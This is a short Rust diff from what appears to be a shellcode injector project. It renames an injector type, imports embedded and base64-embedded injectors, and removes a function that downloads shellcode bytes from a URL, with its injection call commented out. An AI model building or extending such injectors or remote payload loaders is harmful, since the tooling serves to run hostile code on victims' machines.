@@ -1,18 +1,9 @@
 mod injectors;
 use injectors::{
-    InjectorType,
-    embedded::EmbeddedInjector
+    InjectionType,
+    embedded::EmbeddedInjector,
+    b64embedded::Base64EmbeddedInjector
 };
-use reqwest::blocking::get;
 
 
 
-
-fn get_inject_shellcode(url: &str) {
-    if let Ok(res) = get(url) {
-        if res.status().is_success() {
-            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
-            // inject(sc);
-        }
-    }
-}
